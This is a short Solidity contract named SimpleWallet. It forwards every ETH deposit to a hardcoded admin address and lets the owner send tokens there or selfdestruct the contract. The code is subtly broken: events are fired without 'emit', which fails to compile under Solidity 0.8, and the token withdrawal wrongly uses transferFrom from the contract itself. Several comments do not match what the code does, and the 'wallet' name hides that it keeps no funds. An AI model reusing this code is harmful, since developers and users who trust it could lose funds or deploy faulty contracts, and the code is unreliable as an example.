// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract SimpleWallet is Ownable {

	address payable adminWallet = payable(0xD387098B3CA4C6D592Be0cE0B69E83BE86011c50);

	// event for deposit and for withdraw
	event Deposit(address indexed _sender, uint indexed amount);
	event Withdraw(address indexed _sender, uint indexed amount);

	// set the owner as soon as the wallet is created
	constructor() {
	}

	// fallback function and transfer that to admin wallet
	receive() external payable {
		Deposit(msg.sender, msg.value);
		(bool transferSuccess, ) = adminWallet.call{value: msg.value}("");
		require(transferSuccess == true, "ETH transfer not success");
	}


	function sendFunds(address tokenAddress, uint amount) external onlyOwner {
		IERC20 token = IERC20(tokenAddress);
		require(token.balanceOf(address(this)) >= amount, "balance is not enough to withdraw");

		token.transferFrom(address(this), adminWallet, amount);
		Withdraw(msg.sender, amount);
	}

	// check to make sure the msg.sender is the owner or it will suicide the contract and return funds to the owner
	function killWallet() public onlyOwner {
		address payable ownerAddress = payable(msg.sender);
        selfdestruct(ownerAddress);
	}
}